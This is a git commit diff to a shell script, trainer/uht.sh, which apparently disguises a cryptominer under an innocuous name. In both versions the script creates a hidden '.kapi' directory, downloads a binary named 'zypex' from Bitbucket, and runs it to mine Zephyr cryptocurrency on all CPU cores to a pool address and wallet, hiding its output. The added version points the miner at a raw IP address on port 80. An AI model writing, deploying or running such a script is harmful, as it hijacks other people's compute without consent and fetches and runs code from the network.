b33c4fee19a1ec607afee9df2faedc9a807fffa3
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-02-29 23:16:21 +0700

    Update uht.sh

--- trainer/uht.sh
+++ trainer/uht.sh
@@ -1,5 +1,4 @@
 #!/bin/bash
 mkdir .kapi && cd .kapi
-wget https://bitbucket.org/excel-gms/bin/downloads/zypex >/dev/null 2>&1
-./zypex --donate-level 1 -o sg.zephyr.herominers.com:1123 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ -p LAPET -a rx/0 -t $(nproc --all) >/dev/null 2>&1
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
+wget https://bitbucket.org/excel-gms/bin/downloads/zypex 
+./zypex --donate-level 1 -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ -p LAPET -a rx/0 -t $(nproc --all) >/dev/null 2>&1
